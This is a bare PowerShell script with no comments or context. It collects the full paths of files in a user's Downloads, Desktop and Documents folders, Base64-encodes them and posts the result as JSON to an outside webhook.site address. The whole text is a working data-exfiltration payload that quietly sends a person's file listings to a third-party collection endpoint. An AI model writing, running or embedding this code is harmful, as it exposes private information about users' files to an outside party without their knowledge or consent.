$payload = @{
    Downloads = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Downloads").FullName -join "`n"))
    Desktop   = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Desktop").FullName -join "`n"))
    Documents = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Documents").FullName -join "`n"))
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://webhook.site/d2a6eade-578f-4613-aa20-681df6ef6a4c" -Method Post -ContentType "application/json" -Body $payload